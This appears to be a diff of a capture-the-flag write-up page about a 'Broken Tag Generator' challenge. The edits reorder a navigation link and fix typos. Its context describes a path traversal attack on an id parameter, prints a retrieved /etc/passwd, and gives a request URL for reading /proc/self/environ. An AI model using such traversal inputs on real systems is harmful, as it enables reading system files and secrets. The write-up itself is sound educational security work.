@@ -109,6 +109,10 @@
                     </li>
                 </ul>
                 <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Kringle-kiosk/A-Kringle-kiosk/">Achivement Kiosk</a>
+                    </li>
+                </ul>
+                <ul>
                     <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Elf-Code/A-Elf-Code/">Achivement ElfCode</a>
                     </li>
                 </ul>
@@ -118,10 +122,6 @@
                 </ul>
                 <ul>
                     <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Redis/A-Redis/">Achivement Redis</a>
-                    </li>
-                </ul>
-                <ul>
-                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Kringle-kiosk/A-Kringle-kiosk/">Achivement Kiosk</a>
                     </li>
                 </ul>
                 <ul>
@@ -199,7 +199,7 @@
 <p>ANSWER: JackFrostWasHere</p>
 <p><img alt="Access" src="../8-Broken-Tag-Generator-access.png" /></p>
 <h2 id="finding-the-vulnerability">Finding the vulnerability</h2>
-<p>After requesting the URL https://tag-generator.kringlecastle.com/image the server sends a hint of the possible vulenrability that is visible in the browser but curl or burp give more information, where we can see this response use <code>501</code> http status code.</p>
+<p>After requesting the URL https://tag-generator.kringlecastle.com/image the server sends a hint of the possible vulnerability that is visible in the browser but curl or burp give more information, where we can see this response use <code>501</code> http status code.</p>
 <pre><code>HTTP/1.1 501 Not Implemented
 Server: nginx/1.14.2
 Date: Mon, 21 Dec 2020 02:22:22 GMT
@@ -214,7 +214,7 @@ X-Frame-Options: SAMEORIGIN
 
 &lt;p&gt;Error in /app/lib/app.rb: ID is missing!&lt;/p&gt;
 </code></pre>
-<p>Next request, lets attempt a LFI on the <code>id</code> parameter using a well known file <code>/etc/passwd</code>, the request failed but the error message is different, this time the server sends a <code>404</code> not found with the message route not found in <code>/app/lib/app.rb</code>.</p>
+<p>Next request, lets attempt a LFI on the <code>id</code> parameter using a well-known file <code>/etc/passwd</code>, the request failed but the error message is different, this time the server sends a <code>404</code> not found with the message route not found in <code>/app/lib/app.rb</code>.</p>
 <pre><code>HTTP/1.1 404 Not Found
 Server: nginx/1.14.2
 Date: Mon, 21 Dec 2020 02:24:33 GMT
@@ -227,7 +227,7 @@ X-Content-Type-Options: nosniff
 
 &lt;p&gt;Error in /app/lib/app.rb: Route not found&lt;/p&gt;
 </code></pre>
-<p>This means that the application may prepend a fixed string to our request so lets improve our previous request with a path traversal.</p>
+<p>This means that the application may prepend a fixed string to our request so let's improve our previous request with a path traversal.</p>
 <pre><code>HTTP/1.1 200 OK
 Server: nginx/1.14.2
 Date: Mon, 21 Dec 2020 02:30:00 GMT
@@ -262,7 +262,7 @@ nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 app:x:1000:1000:,,,:/home/app:/bin/bash
 </code></pre>
-<p>Now we know that it sucessfully retrieves files from the file system, the target is to obtain the value of the <code>GREETZ</code> environmental variable. To get all environmental variables of the runnin process we can send the request to https://tag-generator.kringlecastle.com/image?id=../../proc/self/environ</p>
+<p>Now we know that it sucessfully retrieves files from the file system, the target is to obtain the value of the <code>GREETZ</code> environmental variable. To get all environmental variables of the runnin process we can send the request to <code>https://tag-generator.kringlecastle.com/image?id=../../proc/self/environ</code></p>
 <pre><code>HTTP/1.1 200 OK
 Server: nginx/1.14.2
 Date: Mon, 21 Dec 2020 02:33:44 GMT
